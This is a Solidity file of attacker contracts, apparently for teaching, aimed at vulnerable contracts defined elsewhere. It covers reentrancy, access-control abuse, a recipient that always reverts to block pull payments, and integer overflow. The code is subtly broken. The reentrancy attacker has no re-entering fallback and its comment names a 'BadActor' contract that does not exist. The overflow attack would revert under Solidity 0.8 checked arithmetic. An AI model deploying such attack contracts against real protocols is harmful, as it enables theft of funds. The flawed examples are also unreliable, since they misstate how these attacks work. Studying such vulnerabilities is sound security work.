pragma solidity ^0.8.0;

//reentrancy
//In this example, the attacker creates a BadActor contract and sets the targetContract to the address of the ExploitableWithdraw contract. The attack function calls the withdraw function in a loop, transferring 1 ether to the attacker's address each time.
// By repeatedly calling the function before the balance is
//updated, the attacker can drain the contract's funds.
contract MaliciousWithdraw {
    address payable private targetContract;

    constructor(address payable _targetContract) {
        targetContract = _targetContract;
    }

    function attack() external payable {
        for (uint256 i = 0; i < 100; i++) {
            targetContract.call{value: 1 ether}(
                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
            );
        }
    }
}

//AccessControl
contract MaliciousAccessControl {
    ExploitableAccessControl target;

    constructor(address _target) {
        target = ExploitableAccessControl(_target);
    }

    function attack() external {
        target.restrictedFunction(999999999999999999999);
    }
}

//Pull Payment Pattern
//this contract falls back when it recevices payment and reverts.
contract MaliciousRecipient {
    fallback() external {
        revert("Malicious recipient");
    }
}

//Aritmethic
//For the ExploitableArithmetic contract, an attacker could call the unsafeAdd function with large values to cause an integer overflow:
contract MaliciousArithmetic {
    ExploitableArithmetic target;

    constructor(address _target) {
        target = ExploitableArithmetic(_target);
    }

    function attack() external {
        uint256 a = 2 ** 255;
        uint256 b = 2 ** 255;
        target.unsafeAdd(a, b);
    }
}
